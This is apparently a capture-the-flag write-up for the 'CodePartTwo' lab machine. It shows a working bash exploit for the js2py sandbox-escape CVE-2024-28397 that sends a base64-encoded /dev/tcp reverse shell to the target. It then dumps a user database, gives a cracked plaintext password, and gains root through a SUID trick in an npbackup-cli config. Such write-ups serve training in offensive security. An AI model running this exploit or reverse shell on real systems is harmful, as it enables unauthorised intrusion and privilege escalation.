# CodePartTwo - js2py 0.74 / npbackup-cli PE

### 80 port - Analysis

[image]

## js2py CVE-2024-28397 RCE

```bash
#!/bin/bash
read -p "Target URL: " url
read -p "Your IP: " ip
read -p "Your Port: " port

cmd="sh -i >& /dev/tcp/$ip/$port 0>&1"
b64=$(echo -n "$cmd" | base64 -w 0)

js_code="let cmd = \"printf $b64|base64 -d|bash\";
let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__;
let obj = a(a(a,\"__class__\"), \"__base__\");
function findpopen(o) {
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i];
        if(item.__module__ == \"subprocess\" && item.__name__ == \"Popen\") {
            return item;
        }
        if(item.__name__ != \"type\") {
            let result = findpopen(item);
            if(result) return result;
        }
    }
}
let result = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
console.log(result);
result;"

curl -s -X POST -H "Content-Type: application/json" \
    -d "$(jq -n --arg code "$js_code" '{code: $code}')" "$url"
```

## Found users.db from app

```bash
sqlite3
sqlite> .open users.db
sqlite> select * from user;
```

[image]

## Cracking password of Marco

[image]

## Shell as Marco

```bash
su marco
Password: sweetangelbabylove
```

[image]

### Sudo shell-escape attack - /usr/local/bin/npbackup-cli

`npbackup-cli` is part of **Veritas NetBackup**, an enterprise backup and recovery solution.

[image]

## Exploit way

Хэрэглэгчээс өгсөн config файлыг ажиллуулах боломжтой байна. Үүгээр дамжуулж chmod +s эрхийг /bin/bash дээр тохируулна.

**pre_exec_commands** нь arbitrary код ажиллуулах боломжтой.

[image]

## Shell as Root

```bash
sudo /usr/local/bin/npbackup-cli -c root.conf -b
/bin/bash -p
```

[image]
